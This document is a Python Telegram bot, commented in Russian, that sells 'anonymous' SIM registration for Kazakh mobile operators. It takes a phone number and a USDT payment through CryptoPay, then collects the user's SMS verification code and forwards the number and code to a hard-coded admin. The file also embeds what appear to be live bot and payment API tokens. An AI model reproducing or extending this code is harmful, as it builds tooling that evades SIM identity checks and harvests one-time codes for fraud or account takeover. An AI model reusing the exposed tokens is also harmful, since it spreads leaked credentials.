import asyncio
import logging
import re
from typing import Dict, List, Any

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ИСПРАВЛЕННЫЙ ИМПОРТ
from aiocryptopay import AioCryptoPay

# ================= НАСТРОЙКИ =================
TOKEN = "8623489996:AAE5rfYaS4JbAGrso_veeFALIsLagXx74s8"
ADMIN_ID = 8209617821
CRYPTO_TOKEN = "553031:AAYPKOXkV5DTYcbIKdQYUlhLFwrI9Ah0YYG"

# 2.58$ (минус комиссия 3% = тебе придет ровно 2.5$)
PRICE_USD = 2.58 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ИСПРАВЛЕННОЕ СОЗДАНИЕ ОБЪЕКТА
crypto = AioCryptoPay(token=CRYPTO_TOKEN, testnet=False)

router = Router()
dp.include_router(router)

class RegForm(StatesGroup):
    operator = State()
    phone = State()

# Список заявок в оперативной памяти
pending_requests: List[Dict[str, Any]] = []

# ================= КЛАВИАТУРЫ =================
def get_main_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📞 Сдать номер на вериф")]
    ], resize_keyboard=True)

def get_operators_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="Activ"), KeyboardButton(text="Tele2"), KeyboardButton(text="Altel")],
        [KeyboardButton(text="← Назад")]
    ], resize_keyboard=True)

# ================= ХЕНДЛЕРЫ КЛИЕНТА =================
@router.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "👋 Привет! Это бот для анонимной регистрации SIM.\n"
        "Безопасно. Быстро. Анонимно.",
        reply_markup=get_main_kb()
    )

@router.message(F.text == "📞 Сдать номер на вериф")
async def start_reg(message: Message, state: FSMContext):
    await message.answer(
        f"📊 **Выбери оператора:**\n"
        f"💰 Стоимость услуги: ${PRICE_USD} (USDT)",
        reply_markup=get_operators_kb(),
        parse_mode="Markdown"
    )
    await state.set_state(RegForm.operator)

@router.message(RegForm.operator, F.text.in_({"Activ", "Tele2", "Altel"}))
async def choose_op(message: Message, state: FSMContext):
    await state.update_data(operator=message.text)
    await message.answer(f"📱 Оператор: {message.text}\nВведи номер (например: 77071234567):")
    await state.set_state(RegForm.phone)

@router.message(RegForm.phone)
async def process_phone(message: Message, state: FSMContext):
    phone = re.sub(r"\D", "", message.text)
    if len(phone) < 10:
        return await message.answer("❌ Ошибка в номере. Введи еще раз:")
    
    data = await state.get_data()
    
    try:
        # СОЗДАНИЕ ИНВОЙСА ЧЕРЕЗ CRYPTOPAY
        invoice = await crypto.create_invoice(asset='USDT', amount=PRICE_USD)
        rid = invoice.invoice_id
        
        pending_requests.append({
            "id": rid, 
            "user_id": message.chat.id, 
            "phone": phone, 
            "operator": data['operator'], 
            "status": "waiting_pay"
        })

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить", url=invoice.pay_url)],
            [InlineKeyboardButton(text="✅ Проверить оплату", callback_data=f"check_{rid}")]
        ])

        await message.answer(
            f"🧾 **Заявка #{rid} создана**\n"
            f"💰 К оплате: {PRICE_USD} USDT\n\n"
            "Оплати счет и нажми кнопку ниже:",
            reply_markup=kb,
            parse_mode="Markdown"
        )
        await state.clear()
    except Exception as e:
        logging.error(f"CryptoPay Error: {e}")
        await message.answer("⚠️ Ошибка платежной системы. Попробуйте позже.")

# ================= ПРОВЕРКА ОПЛАТЫ =================
@router.callback_query(F.data.startswith("check_"))
async def check_payment(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    
    # ПРОВЕРКА СТАТУСА ИНВОЙСА
    invoices = await crypto.get_invoices(invoice_ids=rid)
    
    is_paid = False
    if isinstance(invoices, list):
        for inv in invoices:
            if inv.invoice_id == rid and inv.status == 'paid':
                is_paid = True
    elif invoices and invoices.status == 'paid':
        is_paid = True

    if is_paid:
        for req in pending_requests:
            if req["id"] == rid:
                req["status"] = "waiting_sms"
                await callback.message.edit_text("💰 **Оплата подтверждена!**\n\nВведите код из СМС:")
                await bot.send_message(ADMIN_ID, f"✅ ОПЛАЧЕНО: Заявка #{rid}\n📱 Номер: {req['phone']}")
                break
    else:
        await callback.answer("❌ Оплата не найдена. Подождите 10-20 секунд.", show_alert=True)

# ================= ПРИЕМ СМС И ФИНАЛ =================
@router.message()
async def catch_sms(message: Message):
    if message.chat.id == ADMIN_ID: return

    # Ищем заявку пользователя, которая ждет СМС
    req = next((r for r in pending_requests if r["user_id"] == message.chat.id and r["status"] == "waiting_sms"), None)
    
    if req and message.text.isdigit():
        await message.answer("⏳ Код принят. Ожидайте завершения регистрации.")
        
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🏁 Завершить", callback_data=f"done_{req['id']}")]
        ])
        
        await bot.send_message(
            ADMIN_ID, 
            f"🔑 **ПОЛУЧЕН КОД СМС:** `{message.text}`\n"
            f"Заявка: #{req['id']}\n"
            f"Номер: {req['phone']}",
            reply_markup=kb,
            parse_mode="Markdown"
        )
    elif req:
        await message.answer("Пожалуйста, введите только цифры из СМС.")

@router.callback_query(F.data.startswith("done_"))
async def finish_job(callback: CallbackQuery):
    rid = int(callback.data.split("_")[1])
    for req in pending_requests:
        if req["id"] == rid:
            req["status"] = "completed"
            await bot.send_message(req["user_id"], "🎉 Регистрация успешно завершена! Номер готов.")
            await callback.message.edit_text(f"🏁 Заявка #{rid} закрыта.")
            break
    await callback.answer()

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
